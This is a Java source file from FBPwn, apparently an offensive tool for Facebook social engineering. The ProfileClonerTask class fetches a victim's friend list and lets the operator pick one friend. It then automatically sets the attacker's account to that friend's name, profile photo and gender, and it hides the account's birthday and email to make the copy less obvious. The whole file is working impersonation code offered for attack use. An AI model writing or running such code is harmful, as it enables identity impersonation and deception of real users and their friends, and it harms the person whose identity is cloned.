/*
 * FBPwn
 * 
 * http://code.google.com/p/fbpwn
 * 
 * Copyright (C) 2011 - FBPwn
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package fbpwn.plugins.core;

import com.gargoylesoftware.htmlunit.html.DomNodeList;
import fbpwn.plugins.ui.ProfileCloningDialog;
import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.html.HtmlAnchor;
import com.gargoylesoftware.htmlunit.html.HtmlCheckBoxInput;
import com.gargoylesoftware.htmlunit.html.HtmlElement;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlOption;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlSelect;
import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
import fbpwn.core.AuthenticatedAccount;
import fbpwn.core.FacebookAccount;
import fbpwn.ui.FacebookGUI;
import fbpwn.core.FacebookTask;
import fbpwn.core.FacebookTaskState;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.SwingUtilities;

public class ProfileClonerTask extends FacebookTask {

    private FacebookAccount targetClone;
    private String targetFname;
    private String targetLname;
    private ImageIcon Pic;
    private Gender targetGender;

    /**
     * Creates a new profile cloner task
     * @param FacebookGUI The GUI used for updating the task's progress
     * @param facebookProfile The victim's profile
     * @param authenticatedProfile The attacker's profile
     * @param workingDirectory The directory used to save all the dumped data
     */
    public ProfileClonerTask(FacebookGUI FacebookGUI,
            FacebookAccount facebookProfile,
            AuthenticatedAccount authenticatedProfile,
            File workingDirectory) {
        super(FacebookGUI, facebookProfile, authenticatedProfile, workingDirectory);
    }

    @Override
    public boolean run() {
        try {
            setTaskState(FacebookTaskState.Running);
            getFacebookGUI().updateTaskProgress(this);
            setMessage("Getting friend list");
            setPercentage(0.0);
            getFacebookGUI().updateTaskProgress(this);
            //getting the friends to be clones of the victim
            final ArrayList<FacebookAccount> victimsFriendList = getFacebookTargetProfile().getFriends();

            if (checkForCancel()) {
                return true;
            }


            if (victimsFriendList == null) {
                setMessage("Failed to get friend list");
                setPercentage(0.0);
                setTaskState(FacebookTaskState.Finished);
                getFacebookGUI().updateTaskProgress(this);
                return true;
            }

            try {
                SwingUtilities.invokeAndWait(new Runnable() {

                    @Override
                    public void run() {
                        ProfileCloningDialog dialog = new ProfileCloningDialog(null, true, victimsFriendList);
                        targetClone = dialog.showSelectionDialog();
                    }
                });
            } catch (InterruptedException ex) {
                Logger.getLogger(AddVictimsFriends.class.getName()).log(Level.SEVERE, "Exception in thread: " + Thread.currentThread().getName(), ex);
            } catch (InvocationTargetException ex) {
                Logger.getLogger(AddVictimsFriends.class.getName()).log(Level.SEVERE, "Exception in thread: " + Thread.currentThread().getName(), ex);
            }
            if (targetClone == null) {
                setTaskState(FacebookTaskState.Finished);
                setMessage("Finished");
                setPercentage(100.0);
                getFacebookGUI().updateTaskProgress(this);
                return true;
            }
            // getting target clone name and profile picture
            targetFname = targetClone.getName().substring(0, targetClone.getName().indexOf(" "));
            targetLname = targetClone.getName().substring(targetClone.getName().indexOf(" ") + 1);
            String targetPicURL = targetClone.getProfilePhotoURL();
            Pic = new ImageIcon(new URL(targetPicURL));

            if (checkForCancel()) {
                return true;
            }

            setMessage("Cloning Name");
            getFacebookGUI().updateTaskProgress(this);
            //setting fake account name to match target clone name
            HtmlPage settings = getAuthenticatedProfile().getBrowser().getPage("http://m.facebook.com/settings/account/?name&refid=0");
            HtmlForm changeNameForm = settings.getForms().get(0);
            HtmlElement firstName = changeNameForm.getInputByName("new_first_name");
            firstName.setAttribute("value", targetFname);
            HtmlElement midName = changeNameForm.getInputByName("new_middle_name");
            midName.setAttribute("value", "");
            HtmlElement lastName = changeNameForm.getInputByName("new_last_name");
            lastName.setAttribute("value", targetLname);
            HtmlSubmitInput submit = settings.getForms().get(0).getInputByValue("Save");

            if (checkForCancel()) {
                return true;
            }

            HtmlPage confirm = submit.click();
            HtmlCheckBoxInput checkBox = confirm.getForms().get(0).getInputByName("confirm_legit_new_name");
            checkBox.click();
            HtmlSubmitInput save = confirm.getForms().get(0).getInputByValue("Save");
            HtmlPage returnPage = save.click();

            if (checkForCancel()) {
                return true;
            }

            setMessage("Cloning profile picture");
            setPercentage(30.0);
            getFacebookGUI().updateTaskProgress(this);
            //setting fake account profile picture to match target clone's picture
            uploadImage();
            setMessage("Configuring info");
            setPercentage(70.0);
            getFacebookGUI().updateTaskProgress(this);
            // getting target clone gender
            HtmlPage MobileInfopage = getAuthenticatedProfile().getBrowser().getPage(targetClone.getMobileInfoPageURL());
            if (MobileInfopage.asXml().contains("Male")) {
                targetGender = Gender.Male;
            } else if (MobileInfopage.asXml().contains("Female")) {
                targetGender = Gender.Female;
            } else {
                targetGender = Gender.Hidden;
            }
            //setting fake account gender to match target clone gender
            HtmlPage basicInfoPage = getAuthenticatedProfile().getBrowser().getPage("http://www.facebook.com/editprofile.php?sk=basic");
            if (targetGender != Gender.Hidden) {
                HtmlSelect genderSelect = (HtmlSelect) basicInfoPage.getElementById("sex");
                HtmlOption sex = (targetGender == Gender.Male) ? genderSelect.getOptionByValue("2") : genderSelect.getOptionByValue("1");
                genderSelect.setSelectedAttribute(sex, true);
            } else {
                //hide gender if target clone gender is hidden
                HtmlCheckBoxInput hideGender = basicInfoPage.getForms().get(2).getInputByName("sex_visibility");
                hideGender.click();
            }
            //hide fake account birthday info
            HtmlSelect birthday = (HtmlSelect) basicInfoPage.getElementByName("birthday_visibility");
            HtmlOption birthdayVisibility = birthday.getOptionByValue("3");
            birthday.setSelectedAttribute(birthdayVisibility, true);
                        
            HtmlSubmitInput saveChanges = null;
            
            List<HtmlElement> elementsByName = basicInfoPage.getElementsByTagName("input");
            
            for(HtmlElement e : elementsByName)
            {
                if(e.asText().equals("Save Changes"))
                {
                    saveChanges = (HtmlSubmitInput) e;
                }
            }
            
            
            saveChanges.click();
            //hide fake account email info
            HtmlPage contactInfoPage = getAuthenticatedProfile().getBrowser().getPage("http://www.facebook.com/editprofile.php?sk=contact");
            DomNodeList<HtmlElement> selectors = contactInfoPage.getElementsByTagName("select");
            for (int i = 0; i < selectors.size(); i++) {
                if (selectors.get(i).getAttribute("name").contains("audience")) {
                    HtmlSelect emailVisibility = (HtmlSelect) selectors.get(i);
                    HtmlOption hideEmail = emailVisibility.getOptionByText("Only Me");
                    emailVisibility.setSelectedAttribute(hideEmail, true);
                }
            }
            
            elementsByName = basicInfoPage.getElementsByTagName("input");
            
            for(HtmlElement e : elementsByName)
            {
                if(e.asText().equals("Save Changes"))
                {
                    saveChanges = (HtmlSubmitInput) e;
                }
            }
                        
            saveChanges.click();
            if (checkForCancel()) {
                return true;
            }

            setTaskState(FacebookTaskState.Finished);
            setPercentage(100.0);
            //check for successful name cloning
            if (returnPage.asXml().contains(targetFname)) {
                setMessage("Cloned");
            } else {
                setMessage("Can't change identity for this profile anymore");
            }
            getFacebookGUI().updateTaskProgress(this);
            return true;
        } catch (IOException ex) {
            Logger.getLogger(ProfileClonerTask.class.getName()).log(Level.SEVERE, "Exception in thread: " + Thread.currentThread().getName(), ex);
            return false;
        } catch (FailingHttpStatusCodeException ex) {
            Logger.getLogger(ProfileClonerTask.class.getName()).log(Level.SEVERE, "Exception in thread: " + Thread.currentThread().getName(), ex);
            return false;
        }

    }

    @Override
    public void init() {
    }

    /**
     * upload image then sets it as profile picture
     */
    private void uploadImage() throws IOException {

        File tempImgFile = new File("temp.jpg");
        Image img = Pic.getImage();
        BufferedImage bi = new BufferedImage(img.getWidth(null), img.getHeight(null), BufferedImage.TYPE_3BYTE_BGR);
        Graphics2D g2 = bi.createGraphics();

        g2.drawImage(img, 0, 0, null);
        g2.dispose();

        ImageIO.write(bi, "jpg", tempImgFile);

        HtmlPage uploadPage = getAuthenticatedProfile().getBrowser().getPage("http://m.facebook.com/upload.php?refid=7");
        uploadPage.getForms().get(0).getInputByName("file1").setAttribute("value", tempImgFile.getAbsolutePath());
        uploadPage.getForms().get(0).getInputByValue("Upload").click();
        HtmlPage mobProfilePage = getAuthenticatedProfile().getBrowser().getPage("http://m.facebook.com/profile.php?refid=7");
        List<HtmlAnchor> anchors = mobProfilePage.getAnchors();
        for (HtmlAnchor anc : anchors) {
            if (anc.getAttribute("class").equals("ai ail")) {
                HtmlPage page = getAuthenticatedProfile().getBrowser().getPage("http://m.facebook.com" + anc.getHrefAttribute());
                HtmlPage click = page.getAnchorByText("Make Profile Picture").click();
                click.getForms().get(0).getInputByValue("Confirm").click();
                break;
            }
        }
        tempImgFile.delete();
    }

    @Override
    public String toString() {
        return "Clone a profile";
    }
}

enum Gender {

    Female,
    Male,
    Hidden
}